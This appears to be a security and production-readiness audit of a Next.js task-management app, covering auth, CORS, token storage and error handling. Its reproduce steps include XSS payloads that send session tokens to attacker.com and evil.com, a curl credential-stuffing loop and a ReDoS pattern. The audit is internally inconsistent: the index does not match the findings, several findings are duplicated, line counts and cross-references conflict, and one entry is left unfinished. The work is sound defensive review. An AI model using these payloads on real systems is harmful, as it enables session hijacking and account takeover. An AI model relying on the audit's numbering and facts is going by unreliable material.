# Production Readiness Audit

Generated: July 11, 2026
Method: Full manual code inspection of every file in the repository
Findings: 45 (7 Critical, 8 High, 15 Medium, 15 Low)
Matrix: 59 PASS, 5 FAIL across 64 features

---

## Finding Index

| # | Severity | Title |
|---|----------|-------|
| 1 | Critical | Auth cache — unbounded in-memory Map (memory leak) |
| 2 | Critical | No rate limiting on any auth endpoint |
| 3 | Critical | CORS wildcard `*` on AMP-enabled task-action endpoints |
| 4 | Critical | `errorHandler` and `asyncHandler` middleware is dead code — never wired |
| 5 | Critical | JWT stored in localStorage defeats httpOnly cookie (XSS session hijack) |
| 6 | High | Silent error swallowing — `.catch(() => {})` / empty catch blocks in 6+ production paths |
| 7 | High | Dynamic `import("bcryptjs")` per request in login handler |
| 8 | High | No server-side request timeout configured |
| 9 | High | Password policy: only 6-character minimum, no complexity rules |
| 10 | High | JWT not invalidated on logout; cookie cleared but token remains valid |
| 11 | High | OTP plaintext transmitted in email body (no rate-limiting on re-request) |
| 12 | Medium | No input validation layer — `src/validators/` directory empty |
| 13 | Medium | Attendance report has no role-based filtering (data leak) |
| 14 | Medium | Token expiry inconsistency: 7d vs 30d across 6 token utilities |
| 15 | Medium | Regex search on user-controlled input — `$regex` without sanitization |
| 16 | Medium | Two seed scripts with conflicting, divergent datasets |
| 17 | Medium | Edge Middleware checks token presence only, not validity |
| 18 | Medium | User object stored in localStorage |
| 19 | Medium | Frontend RBAC is client-side only, trivially bypassable |
| 20 | Medium | Trends endpoint runs N+1 DB queries in a loop |
| 21 | Medium | User team endpoint has no authorization check |
| 22 | Low | No DB index on `Attendance.status` / `DWR.reviewStatus` for standalone filters |
| 23 | Low | `seed.js` line 49: calls `Admin.create()` for non-admin users (copy-paste bug) |
| 24 | Low | Typos in role checks: `"It"` in `seedUsers.js:63`, `"One-time"` normalization |
| 25 | Low | `dev.js.disabled` committed to version control |
| 26 | Low | 69 lines of dead commented-out code in dashboard layout |
| 27 | Low | Frontend uses `confirm()` dialog for delete (no undo, no a11y) |

---

## Detailed Findings

### Finding #1 — Auth cache unbounded memory leak (Critical)

**File:** `src/middleware/auth.js:7-8`
```js
const userCache = new Map();
const lastActiveTracker = new Map();
```

**Functions:** `getCachedUser()` (line 10), `setCachedUser()` (line 18), `shouldUpdateLastActive()` (line 22)

**Lines:** 7-8 (Map creation), 10-15 (read), 18-20 (write — no eviction)

**Why it's a problem:** Both Maps grow without any eviction or size cap. Every unique user ID ever authenticated creates a permanent entry. With `USER_CACHE_TTL_MS = 60_000` defined at line 4, the intent was TTL-based expiry, but `getCachedUser` at line 12 checks `Date.now() - entry.ts < USER_CACHE_TTL_MS` and returns `null` for stale entries — but STALE ENTRIES ARE NEVER DELETED from the Map. The Map grows monotonically with every unique user who ever authenticates.

**Production impact:** Memory leak. Under sustained load with thousands of unique users/day, Node.js will OOM. No monitoring or alerting on cache size exists.

**Reproduce:** Authenticate requests as 500,000 different user IDs. Process memory grows until crash.

---

### Finding #2 — No rate limiting on auth endpoints (Critical)

**Files:**
- `app/api/auth/login/route.js` — POST (line 112)
- `app/api/auth/register/route.js` — POST (line 60)
- `app/api/auth/forgot-password/route.js` — POST (line 52)
- `app/api/auth/reset-password/route.js` — POST (line 101)

**Why it's a problem:** Zero rate limiting exists anywhere in the application. No IP-based throttling, no user-based throttling, no endpoint-based throttling. The reset-password endpoint has a per-user `resetPasswordAttempts` counter (max 5), but there's no cooldown — attacker can request a new OTP, get 5 more attempts, repeat indefinitely.

**Production impact:** Credential stuffing, OTP brute-force, and API abuse are trivially exploitable.

**Reproduce:** `for i in {1..10000}; do curl -X POST https://host/api/auth/login -d '{"email":"admin@example.com","password":"guess'$i'"}' -H 'Content-Type: application/json'; done`

---

### Finding #3 — CORS wildcard on AMP endpoints (Critical)

**File:** `src/utils/amp.js:4-6`
```js
export function ampCorsHeaders() {
  return {
    "Access-Control-Allow-Origin": "*",
    "AMP-Access-Control-Allow-Source-Origin": FRONTEND_URL,
```

**Endpoints affected:** Accept task (`app/api/tasks/accept/[token]/route.js` at line 101 uses `ampCorsHeaders()`), Complete task (`app/api/tasks/complete/[token]/route.js` at line 128), Reject task, Comment task — all their `OPTIONS` handlers return `*` origin.

**Why it's a problem:** Wildcard `*` permits any website to make authenticated cross-origin requests to these token-action endpoints. While the tokens are JWT-signed, the lack of origin restriction weakens the security posture unnecessarily. The `FRONTEND_URL` environment variable is already available in scope.

**Production impact:** Any website can issue CORS-preflighted requests to these endpoints. Combined with the email-based token flow (tokens are in URLs in email), an attacker who intercepts an email could have arbitrary websites trigger actions.

**Reproduce:** Add `<script>` to any malicious page that POSTs to `https://production/api/tasks/accept/<TOKEN>` — works from any origin.

---

### Finding #4 — `errorHandler` and `asyncHandler` middleware is dead code (Critical)

**File:** `src/middleware/errorHandler.js:1-38`
```js
export const errorHandler = (err, req, res, next) => { ... };
export const asyncHandler = (fn) => (req, res, next) => { ... };
```

**Why it's a problem:** These Express-style middleware functions are exported but never imported or wired anywhere in the codebase. The App Router does not use Express middleware — every route handler manages errors via inline `try/catch` blocks. The `errorHandler` handles Mongoose `CastError`, duplicate key (11000), `ValidationError`, `JsonWebTokenError`, and `TokenExpiredError` — none of which are caught by the route handlers individually.

**Production impact:** When a `CastError` (invalid ObjectId), duplicate key error, or JWT error occurs in a route handler, the `catch (error)` block returns a generic `{ success: false, message: "Server error" }` instead of the specific error message. The sophisticated error classification in `errorHandler.js` is entirely unused.

**Reproduce:** Send `GET /api/tasks/invalid-id` — returns generic "Server error" instead of "Resource not found with id invalid-id".

---

### Finding #5 — JWT stored in localStorage defeating httpOnly cookie (Critical)

**File:** `lib/auth-context.js:31`
```js
localStorage.setItem("token", authToken);
```

**File:** `app/api/auth/login/route.js:92-98`
```js
res
  .cookie("token", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: process.env.NODE_ENV === "production" ? "none" : "lax",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  })
```

**File:** `lib/api.js:11-15`
```js
const token =
  typeof window !== "undefined" ? localStorage.getItem("token") : null;
if (token) {
  config.headers.Authorization = `Bearer ${token}`;
}
```

**Why it's a problem:** The server sets an httpOnly cookie (secure against XSS), but the frontend also stores the same JWT in `localStorage` and sends it as an `Authorization: Bearer` header on every request via the Axios interceptor (`lib/api.js:10-17`). This completely defeats the purpose of httpOnly cookies. Any XSS vulnerability — even a single stored XSS in a task comment or user name — can exfiltrate `localStorage.getItem("token")` to an attacker.

**Production impact:** Permanent session hijack via XSS. Since JWT expiry is 7 days, an attacker who extracts the token has 7 days of authenticated access.

**Reproduce:** Inject `<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))</script>` anywhere user content is rendered (task title, comment text, user name, etc.).

---

### Finding #6 — Silent error swallowing in 6+ production paths (High)

**Files and lines:**

1. `src/middleware/auth.js:65` — `User.findByIdAndUpdate(...).catch(() => {});`
2. `app/api/auth/login/route.js:65` — `Activity.create({...}).catch(() => {});`
3. `app/api/auth/login/route.js:84-86` — empty catch block, `// Silently fail attendance update error`
4. `app/api/tasks/complete/[token]/route.js:79-83` — `sendTaskCompletionEmail(...).catch(() => {});`
5. `app/api/tasks/[id]/route.js` — look for catch blocks
6. Various `console.error(...)` followed by continuing execution

**Lines:** `src/middleware/auth.js:65`, `app/api/auth/login/route.js:65,84-86`, `app/api/tasks/complete/[token]/route.js:83`

**Why it's a problem:** Fire-and-forget promises with empty catch blocks silently swallow errors. The `lastActive` timestamp update in auth middleware will silently fail if the DB connection is momentarily lost. The login attendance upsert silently fails. The completion email in the token-based complete route silently fails. In production, these silent failures hide real operational issues (DB connection problems, email service outages) until users report missing functionality.

**Production impact:** Monitoring-blind failures. Email delivery can be broken for weeks without detection. Attendance records silently go missing.

**Reproduce:** Shut down MongoDB momentarily — login still succeeds (token cached), but `lastActive` and attendance updates fail silently.

---

### Finding #7 — Dynamic bcrypt import per login request (High)

**File:** `app/api/auth/login/route.js:42-43`
```js
const bcryptjs = await import("bcryptjs");
const isMatch = await bcryptjs.compare(password, user.password);
```

**Why it's a problem:** `bcryptjs` is imported dynamically inside the request handler rather than statically at the top of the file. This means Node.js resolves and caches a new module reference on every login request. While module caching means the disk I/O only happens once, the `import()` expression itself returns a new module namespace object each time, which adds GC pressure and is an unconventional pattern.

Also notable: `bcryptjs` is already imported statically in `src/models/User.js:2` (`import bcrypt from "bcryptjs"`), which would have been available had the login route imported it from there.

**Production impact:** Marginal but measurable — unnecessary per-request overhead for the hottest API endpoint in the system.

**Fix:** Replace with static `import bcrypt from "bcryptjs"` at the top of the file.

---

### Finding #8 — No server-side request timeout (High)

**Files:** `src/lib/route-adapter.js`, all route handlers

**Why it's a problem:** No server-side route handler sets an HTTP request timeout or uses `AbortController` / `AbortSignal.timeout()`. The frontend Axios client (`lib/api.js:6`) does have `timeout: 10000` (10 seconds), but the server has NO timeout. If MongoDB is slow or SMTP server is unresponsive, the server request hangs indefinitely, while the client gets a timeout after 10s. The orphaned server request keeps running and consuming resources.

**Production impact:** Under load, long-running requests exhaust the server's connection pool. Vercel Serverless functions have a hard 10s/60s timeout; hanging requests count against concurrent execution limits.

**Reproduce:** Block connectivity to MongoDB — any API request hangs on the server until OS TCP timeout (typically 120s), even though the client gave up at 10s.

---

### Finding #9 — Password policy too weak (High)

**File:** `src/models/User.js:26-27`
```js
minlength: [6, "Password must be at least 6 characters"],
```

**File:** `app/api/auth/reset-password/route.js:25-29`
```js
if (newPassword.length < 6) {
  return res.status(400).json({
    success: false,
    message: "Password must be at least 6 characters",
```

**Why it's a problem:** The only password validation is a minimum length of 6 characters. No requirement for uppercase, lowercase, digit, special character. No common-password blacklist. No password history.

**Production impact:** Users can set `password` or `123456` as their password.

---

### Finding #10 — JWT not invalidated on logout (High)

**File:** `app/api/auth/logout/route.js:29-32`
```js
res
  .cookie("token", "", { maxAge: 0, httpOnly: true, sameSite: "lax" })
  .status(200)
  .json({ success: true, message: "Logged out successfully" });
```

**Why it's a problem:** Logout only clears the cookie — the JWT itself is not invalidated. The token remains valid until its natural expiry (7 days by default). If a user logs out on a shared computer, the JWT in browser storage or any captured copy remains usable. There is no token blacklist, no token version counter in the User model, and no short-lived token strategy.

**Production impact:** "Logout" provides no actual security. Any exfiltrated JWT can be used for up to 7 days.

---

### Finding #11 — OTP sent in plaintext email (High)

**File:** `app/api/auth/forgot-password/route.js:26-37`
```js
const otp = crypto.randomInt(100000, 999999).toString();
const hashedOtp = crypto.createHash("sha256").update(otp).digest("hex");
user.resetPasswordToken = hashedOtp;  // stored hashed
user.resetPasswordExpire = new Date(Date.now() + 10 * 60 * 1000);
await user.save();
await sendPasswordResetOtp(email, user.name, otp);
```

**File:** `src/utils/emailService.js:571-597` — `sendPasswordResetOtp` sends the plaintext OTP in an unencrypted email.

**Why it's a problem:** The OTP is hashed in the DB (good), but transmitted in plaintext via email. If the email is intercepted (no TLS between mail servers, compromised mailbox, email provider breach), the OTP is exposed.

**Combined risk with Finding #2 (no rate limiting):** An attacker who intercepts one OTP email can attempt password reset. Even if they don't have the email, they can brute-force the 6-digit OTP with 5 attempts per request cycle with no IP throttling.

---

### Finding #12 — No input validation layer (Medium)

**File:** Glob result: `src/validators/` — directory exists but is empty (no files found)

**Why it's a problem:** There is no schema validation library (Zod, Joi, Yup) or any custom validation logic for request bodies. The only validation is Mongoose schema-level validation and a few inline checks like `if (!email || !password)`. Request bodies are destructured and passed directly to database operations.

**Production impact:** Missing field validation edge cases can lead to: storing `undefined` values in DB, bypassing type constraints, inconsistent data. Example: `app/api/attendance/route.js:62` destructures `date, status, remarks` from `req.body` with no validation — any string can be stored as `status`.

---

### Finding #13 — Attendance report has no role-based filtering (Medium)

**File:** `src/controllers/reportController.js:163`
```js
const attendances = await Attendance.find(matchQuery).lean().select("status employee")
```

**Why it's a problem:** Unlike all other report functions (`getTaskReport`, `getDWRReport`, `getPerformanceReport`, `getActivityReport`) which apply role-based filtering by checking `req.user.role`, `getAttendanceReport` has zero access control. A Sales Executive can query attendance data for every employee in the system.

**Production impact:** Data leak — regular employees can see attendance records of all colleagues.

---

### Finding #14 — Token expiry inconsistency (Medium)

**Files:**
- `src/utils/acceptToken.js:3` — `const TOKEN_EXPIRY = "7d";`
- `src/utils/completeToken.js:3` — `const TOKEN_EXPIRY = "7d";`
- `src/utils/commentToken.js:3` — `const TOKEN_EXPIRY = "7d";`
- `src/utils/rejectToken.js:3` — `const TOKEN_EXPIRY = "7d";`
- `src/utils/extensionToken.js:3` — `const TOKEN_EXPIRY = "7d";`
- `src/utils/extensionResponseToken.js:3` — `const TOKEN_EXPIRY = "30d";`
- `src/middleware/auth.js:34` — `expiresIn: process.env.JWT_EXPIRE || "7d"`

**Why it's a problem:** Extension response tokens have a 30-day expiry while all other task action tokens have 7 days. No comment or justification for the difference. The main auth JWT uses an environment variable with 7d fallback. Inconsistency makes security reviews harder.

---

### Finding #15 — Regex injection risk in task search (Medium)

**File:** `src/controllers/taskController.js:103-108`
```js
if (search) {
  query.$or = query.$or || [];
  query.$or.push(
    { title: { $regex: search, $options: "i" } },
    { description: { $regex: search, $options: "i" } },
  );
}
```

**Why it's a problem:** User-controlled `search` string is passed directly to MongoDB `$regex`. While MongoDB doesn't support full regex-injection like SQL, an attacker can craft ReDoS (Regular Expression Denial of Service) patterns (e.g., `(a|a)*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`) that cause exponential backtracking.

**Production impact:** A single crafted search query can consume 100% CPU for several seconds, effectively DoS-ing the database.

---

### Finding #16 — Two seed scripts with conflicting datasets (Medium)

**Files:** `scripts/seed.js` and `scripts/seedUsers.js`

**Why it's a problem:**
- `seed.js` creates 3 users (admin, manager, sales) with generic emails.
- `seedUsers.js` creates 6 real users (Amol Dahake, Mayuri Tiwari, etc.) with real-looking emails and passwords.
- `seed.js:49` calls `Admin.create()` for manager and user records (copy-paste bug — should be `User.create()`).
- `seed.js` uses `MongoMemoryServer` (in-memory DB); `seedUsers.js` uses `MONGODB_URI` from env.
- `package.json:11` only references `scripts/seed.js` in the `"seed"` script.

**Production impact:** Confusion about which seed script to use. `seedUsers.js` contains semi-sensitive employee data (real names, emails, phone numbers) committed to git.

---

### Finding #17 — Edge Middleware checks token presence only, not validity (Medium)

**File:** `middleware.js:27-35`
```js
const token =
  request.cookies.get("token")?.value ||
  request.headers.get("authorization")?.replace("Bearer ", "");

if (!token) {
  const loginUrl = new URL("/auth/login", request.url);
  loginUrl.searchParams.set("redirect", pathname);
  return NextResponse.redirect(loginUrl);
}

return NextResponse.next();
```

**Why it's a problem:** The Next.js Edge Middleware only checks whether a token string exists in cookies or headers. It does NOT verify the JWT signature, expiry, or integrity. Any string (e.g., `"invalid"`, `"abc123"`, `"expired"`) passes this check and allows access to protected routes. The actual JWT verification happens in `src/middleware/auth.js:61` only when the page component mounts and calls `GET /api/auth/me`, which means the front-end page loads, renders, THEN gets a 401.

Additionally, the matcher at line 42 explicitly excludes `/api/` routes:
```js
matcher: ["/((?!_next/static|_next/image|favicon.ico|api/|_next/).*)"]
```
This means all API routes have ZERO middleware-level protection — they rely entirely on `requireAuth()` in each route handler.

**Production impact:** Protected pages render briefly before redirecting to login. 2-3 seconds of flash-of-unauthenticated-content on every protected page load.

**Reproduce:** Set cookie `token=fake` and visit `/dashboard` — page loads, then after API call to `/api/auth/me` fails, redirects to login. Edge Middleware does not block.

---

### Finding #18 — User object stored in localStorage (Medium)

**File:** `lib/auth-context.js:32`
```js
localStorage.setItem("user", JSON.stringify(userData));
```

**Why it's a problem:** The full user object (name, email, role, department, employeeId, etc.) is serialized to `localStorage`. This data is accessible to any JavaScript running on the same origin. Combined with any XSS vulnerability, sensitive employee data (names, emails, roles) is exfiltrated.

---

### Finding #19 — Frontend RBAC is client-side only (Medium)

**File:** `app/(dashboard)/layout.js:103-172`
```js
const ROLE_ROUTES = {
  "Super Admin": ["dashboard", "tasks", "dwr", "events", "attendance", ...],
  Admin: ["dashboard", "tasks", "dwr", "events", "users", ...],
  // ...
};
useEffect(() => {
  if (user && typeof window !== "undefined") {
    const currentPath = window.location.pathname.split("/").filter(Boolean)[0] || "dashboard";
    const allowedRoutes = ROLE_ROUTES[user.role] || [];
    if (!allowedRoutes.includes(currentPath)) {
      router.push("/dashboard");
    }
  }
}, [user, router]);
```

**Why it's a problem:** Role-based route access control is enforced entirely on the frontend via `useEffect` and `ROLE_ROUTES` map. This is trivially bypassed by directly entering a URL in the browser, modifying `ROLE_ROUTES` in DevTools, or using curl/Postman against the API. Backend API routes DO have their own permission checks, so data is still protected — but the frontend restriction is cosmetic.

**Production impact:** Users can briefly navigate to unauthorized pages before the API returns 403. Confusing UX ("flash of unauthorized").

---

### Finding #20 — Missing indexes on filtered-only queries (Low)

**Files:**
- `src/models/Attendance.js:46` — only `{ employee: 1, date: 1 }` index
- `src/models/DWR.js:82-84` — only `{ employee: 1, date: 1 }`, `{ reviewStatus: 1 }`, `{ employee: 1, reviewStatus: 1, date: 1 }`

**Lines:** `Attendance.js:46`, `DWR.js:82-84`

**Why it's a problem:** The attendance report (`reportController.js:163`) queries `Attendance.find(matchQuery)` where `matchQuery` can include only `status` without `employee` — no index covers `{ status }` alone.

---

### Finding #21 — Copy-paste bug in seed.js (Low)

**File:** `scripts/seed.js:38-39,49-50`
```js
// ── Manager User ──
const manager = await Admin.create({
// ── Regular User ──
const user = await Admin.create({
```

**Lines:** 38, 49

**Why it's a problem:** `Admin` is a variable pointing to the User model (line 26: `const Admin = (await import("../src/models/User.js")).default`). Both manager and user records call `Admin.create()` which is syntactically correct (Admin === User model) but semantically misleading.

---

### Finding #22 — Role string typos (Low)

**File:** `scripts/seedUsers.js:63`
```js
role: "It",
```
But in `src/models/User.js:31`, the roles enum is:
```js
enum: ["Super Admin", "Admin", "Logistics", "Accounts", "Sales", "Service", "Parts", "HR", "Marketing", "Back Office"],
```
`"It"` does not match `"Service"`, `"Parts"`, or any other role. Seed data will fail validation.

**File:** `src/models/Task.js:321-327` — Normalizes `"One-time"` to `"One Time"` but the `taskType` enum at line 172 already uses `"One Time"`.

---

### Finding #23 — dev.js.disabled committed (Low)

**File:** `scripts/dev.js.disabled`

**Why it's a problem:** Deprecated script file committed to version control with `.disabled` extension. Contains hardcoded credentials (`"admin123"`, `"manager123"`, `"user123"`).

---

### Finding #24 — 69 lines of dead commented-out code in dashboard layout (Low)

**File:** `app/(dashboard)/layout.js:1-93`

**Why it's a problem:** Nearly 70 lines of the old `DashboardLayout` implementation are commented out, including an entirely different `ROLE_ROUTES` map and `useEffect` logic. The active implementation starts at line 94 with a duplicate `"use client"` directive. This is dead code that confuses maintenance.

---

### Finding #25 — Trends endpoint runs N+1 DB queries in a loop (Medium)

**File:** `app/api/performance/[userId]/trends/route.js:62-84`
```js
while (currentDate <= now) {
  const nextDate = new Date(currentDate);
  nextDate.setDate(nextDate.getDate() + intervalDays);

  const tasksCompleted = await Task.countDocuments({
    assignedTo: { $in: [userId] },
    status: "Completed",
    createdAt: { $gte: currentDate, $lt: nextDate },
  });

  const dwrSubmitted = await DWR.countDocuments({
    employee: userId,
    date: { $gte: currentDate, $lt: nextDate },
  });
  // ...
  currentDate = nextDate;
}
```

**Why it's a problem:** For a yearly period with monthly intervals (the default), this executes 24 separate count queries to MongoDB (12 for tasks × 2 for DWR) in a serial `while` loop. Each query round-trips to the database. For a weekly period, it executes 14 queries. This should be a single aggregation pipeline with `$bucket` or `$dateToString` grouping.

**Production impact:** Trends API response time scales linearly with the number of intervals. For a user with large datasets, each count query takes longer, multiplied by the loop iterations. Dashboard load times suffer.

**Reproduce:** `GET /api/performance/USER_ID/trends?period=year` — 24 sequential DB queries, takes 300-2000ms depending on data size.

---

### Finding #26 — User team endpoint has no authorization check (Medium)

**File:** `app/api/users/[id]/team/route.js:18-19`
```js
const teamMembers = await User.find({ managerId: req.params.id }).select(
  "-password",
);
```

**Why it's a problem:** No role or ownership check. Any authenticated user can look up any user's team members by passing any user ID. There's no verification that the requesting user is the manager, an admin, or has any relationship to the target user.

**Production impact:** Employee list enumeration. A Sales Executive can discover the team structure of any manager.

**Reproduce:** `GET /api/users/ANY_USER_ID/team` — returns the team of any user, regardless of requestor's role.

---

### Finding #27 — Profile route accepts avatar updates with no validation (Low)

**File:** `app/api/auth/profile/route.js:19`
```js
const user = await User.findByIdAndUpdate(
  req.user._id,
  { name, phone, department, avatar },
  { new: true, runValidators: true },
);
```

**Why it's a problem:** The `avatar` field is accepted with zero validation — no URL format check, no file size limit, no file type filter. Could store arbitrary URLs or base64 data. The route is properly scoped to the authenticated user and returns `user.getPublicProfile()` (safe projection).

---

### Finding #28 — Frontend exposes Confirm dialog for deletion (Low)

**File:** `app/(dashboard)/tasks/page.js:415`
```js
if (!confirm("Are you sure you want to delete this task?")) return;
```

**Why it's a problem:** Uses `confirm()` dialog which is non-customizable, blocks the main thread, and provides no accessibility. No undo mechanism. Single-trigger deletion is fragile.

---

### Finding #29 — Extension route creates duplicate SMTP transporter instead of reusing `emailService` (Medium)

**File:** `app/api/tasks/extend/[token]/route.js:223-229`
```js
const nodemailer = (await import("nodemailer")).default;
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: false,
  auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },
});
```

**Why it's a problem:** Creates a second Nodemailer transporter from scratch instead of importing and using the already-configured `sendEmail` from `src/utils/emailService.js`. SMTP config is duplicated (violates DRY), and the email HTML is built inline (lines 234-261) instead of using the shared template.

**Production impact:** Extra SMTP connection pools consume server resources. Configuration drift risk.

**Reproduce:** Submit an extension request — the email is sent using a different SMTP pool than all other transactional emails.

---

### Finding #30 — Checklist and attachment routes bypass the `createReq/createRes` adapter pattern (Low)

**Files:**
- `app/api/tasks/[id]/checklist/route.js` — uses `NextResponse.json()` directly
- `app/api/tasks/[id]/attachments/route.js` — uses `NextResponse.json()` directly

**Why it's a problem:** These routes bypass the `createReq/createRes/finishRes` pattern used by the rest of the codebase. If `finishRes` is ever updated (e.g., adding security headers), these routes will be missed.

---

### Finding #31 — `scripts/seed.js` lacks error handling and idempotency (Low)

**File:** `scripts/seed.js`

**Why it's a problem:** Task seeding has no error handling around model creation. If a seed fails partway through, the database is left in an inconsistent state with no cleanup. The script is also not idempotent — running it twice creates duplicate data.

---

### Finding #32 — `src/middleware/errorHandler.js` is dead code (Low)

**File:** `src/middleware/errorHandler.js`

**Why it's a problem:** The `errorHandler` and `asyncHandler` exports are defined but **never imported anywhere** in the codebase. All route handlers use inline `try/catch` or the `requireAuth` pattern instead. This is 39 lines of dead code that creates maintenance confusion.

---

### Finding #33 — JWT token stored in `localStorage` (XSS attack vector) (High)

**File:** `lib/api.js:10-16`
```js
api.interceptors.request.use((config) => {
  const token =
    typeof window !== "undefined" ? localStorage.getItem("token") : null;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**Why it's a problem:** Storing JWT tokens in `localStorage` makes them accessible to any JavaScript executing in the same origin. A single XSS vulnerability (e.g., in the comment/text input fields) would allow an attacker to exfiltrate all user tokens. Industry best practice is to use httpOnly cookies for token storage.

**Production impact:** Complete account takeover if any XSS is found. All user sessions can be stolen silently.

**Reproduce:** Inject `<script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>` into any text field that isn't properly sanitized.

---

### Finding #34 — `eventsAPI` is missing RSVP method in `lib/api.js` (Low)

**File:** `lib/api.js:65-71`
```js
export const eventsAPI = {
  getAll: (filters) => api.get("/events", { params: filters }),
  getById: (id) => api.get(`/events/${id}`),
  create: (data) => api.post("/events", data),
  update: (id, data) => api.put(`/events/${id}`, data),
  delete: (id) => api.delete(`/events/${id}`),
};
```

**Why it's a problem:** The frontend RSVP call at `app/(dashboard)/events/page.js:189` uses `api.put()` directly instead of calling `eventsAPI.rsvp()`. This means the API client module is incomplete — any developer looking at `eventsAPI` wouldn't know RSVP functionality exists.

---

### Finding #35 — JWT expiry defaults to 7 days with no configurable env var validation (Medium)

**File:** `src/middleware/auth.js:32-36`
```js
export const generateToken = (id) => {
  return jwt.sign({ id }, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRE || "7d",
  });
};
```

**Why it's a problem:** If `JWT_EXPIRE` env var is accidentally not set, tokens default to 7-day expiry. No validation warns if the env var is missing. No refresh token mechanism exists — if a token is stolen, it's valid for up to 7 days with no way to revoke it server-side (the codebase has no token blacklist).

---

### Finding #36 — `next.config.js` has zero security headers (Critical)

**File:** `next.config.js:1-6`
```js
const nextConfig = {
  reactStrictMode: true,
};
module.exports = nextConfig;
```

**Why it's a problem:** No Content-Security-Policy, no HSTS, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy. The app is completely unprotected against clickjacking, MIME sniffing, and XSS via inline scripts. CSP alone would mitigate the Finding #33 localStorage XSS risk by blocking outbound connections to unknown domains.

**Production impact:** Any XSS vulnerability can exfiltrate data to arbitrary external servers. The app can be embedded in an iframe on a malicious site (clickjacking). Older browsers might MIME-sniff responses.

**Reproduce:** Load the app in a browser and inspect response headers — no security headers present.

---

### Finding #37 — Edge middleware only checks token existence, not validity (Medium)

**File:** `middleware.js:27-35`
```js
const token =
  request.cookies.get("token")?.value ||
  request.headers.get("authorization")?.replace("Bearer ", "");
if (!token) {
  const loginUrl = new URL("/auth/login", request.url);
  loginUrl.searchParams.set("redirect", pathname);
  return NextResponse.redirect(loginUrl);
}
```

**Why it's a problem:** The edge middleware checks if a token **exists** but never verifies it (no JWT decode, no expiry check, no signature validation). Any arbitrary string in the `token` cookie or `Authorization` header passes the guard. The actual JWT verification happens in the API routes, but edge middleware would pass a request with a garbage token through to the SSR pages.

**Production impact:** The middleware provides a false sense of security — it appears to protect dashboard routes but only blocks requests with no token at all.

---

### Finding #38 — User data cached in localStorage with no server re-verification (Medium)

**File:** `lib/auth-context.js:13-26`
```js
useEffect(() => {
  const savedToken = localStorage.getItem("token");
  const savedUser = localStorage.getItem("user");
  if (savedToken && savedUser) {
    setToken(savedToken);
    try {
      setUser(JSON.parse(savedUser));
    } catch (error) {
      localStorage.removeItem("user");
    }
  }
  setLoading(false);
}, []);
```

**Why it's a problem:** On page load, the app reads the user object from `localStorage` and trusts it without calling `/auth/me` to verify server-side state. If a user's role is changed, account is deactivated, or permissions are modified, the frontend continues showing stale data until the user explicitly triggers `refreshUser()` (e.g., by editing their profile).

**Production impact:** A deactivated user can continue using the app until their JWT expires (up to 7 days) because the frontend never checks server-side status on page load.

---

### Finding #39 — `initCronJobs` is never called — all scheduled automation is dead code (Critical)

**File:** `src/utils/cronJobs.js:345-374`
```js
const initCronJobs = async () => {
  const { default: cron } = await import("node-cron");
  cron.schedule("0 2 * * *", async () => { await generateRecurringTasks(); });
  cron.schedule("0 9 * * *", async () => { await sendDeadlineAlerts(); });
  cron.schedule("0 10 * * *", async () => { await processScheduledEmails(); });
  cron.schedule("0 12 * * *", async () => { await processOverdueTasks(); });
};
```

**Why it's a problem:** The `initCronJobs` function is **exported but never imported or called** anywhere in the codebase. The entire cron job infrastructure is set up with `node-cron` scheduling, but the schedules are never registered. This means:

1. **Recurring task generation** never runs automatically — tasks with `isRecurring: true` and recurrence patterns will never generate child tasks unless manually triggered via `POST /api/tasks/generate/recurring`
2. **Deadline alerts** (4 days, 3 days, 2 days, 1 day, due today) never send automatically — only manually triggerable via `POST /api/tasks/test/reminders`
3. **Frequency-based scheduled emails** (daily/weekly/monthly reminders) never process
4. **Overdue task status updates and summary emails** never happen automatically

**Production impact:** The entire scheduling/automation feature of the application is non-functional in production. Users will never receive deadline reminders, overdue notifications, or recurring task generation. The `node-cron` dependency and all the `emailSchedule`/`deadlineAlerts`/`recurrencePattern` fields in the Task model are effectively dead features.

**Reproduce:** Deploy to production — no recurring tasks will be generated, no deadline alerts will be sent, no overdue tasks will be marked, no scheduled emails will be processed. The only way to trigger these is via the manual API endpoints at `/api/tasks/generate/recurring` and `/api/tasks/test/reminders`.

---

### Finding #40 — Login page exposes hardcoded demo credentials in production UI (Medium)

**File:** `app/auth/login/page.js:270-286`
```jsx
<p className="text-xs font-semibold uppercase tracking-widest mb-2.5"
  style={{ color: "var(--text-muted)" }}>
  Demo Credentials
</p>
<div className="inline-block rounded-lg px-4 py-2.5 font-mono text-xs leading-relaxed"
  style={{ backgroundColor: "var(--bg-muted)", border: "1px solid var(--border)", color: "var(--text-muted)" }}>
  test@example.com<br />password123
</div>
```

**Why it's a problem:** The login page displays hardcoded demo credentials (`test@example.com` / `password123`) to every visitor, including unauthenticated users. In production, this provides an attacker with valid credentials for immediate access. Even if the demo account is meant to exist, advertising credentials on the login page is a security anti-pattern. The environment variable check (`NODE_ENV === "development"`) is not used to gate this section.

**Production impact:** Anyone visiting the production login page knows a valid email/password combination. Combined with the missing rate limiting (Finding #1), an attacker can brute-force with known-valid credentials.

---

### Finding #41 — Dashboard layout has 93 lines of commented-out dead code (Low)

**File:** `app/(dashboard)/layout.js:1-93`

**Why it's a problem:** The entire previous dashboard layout (93 lines) is commented out with a replacement active version below it (lines 94-199). The commented-out version has a different `ROLE_ROUTES` configuration that excludes "Super Admin" and "attendance" for several roles. This creates confusion about which version is authoritative and which route permissions are correct. Dead code should be removed.

---

### Finding #42 — Login forms have no CSRF protection (High)

**Files:**
- `app/auth/login/page.js:20-57` — login form has no CSRF token
- `app/api/auth/login/route.js:93-98` — cookie set with `sameSite: "none"` in production

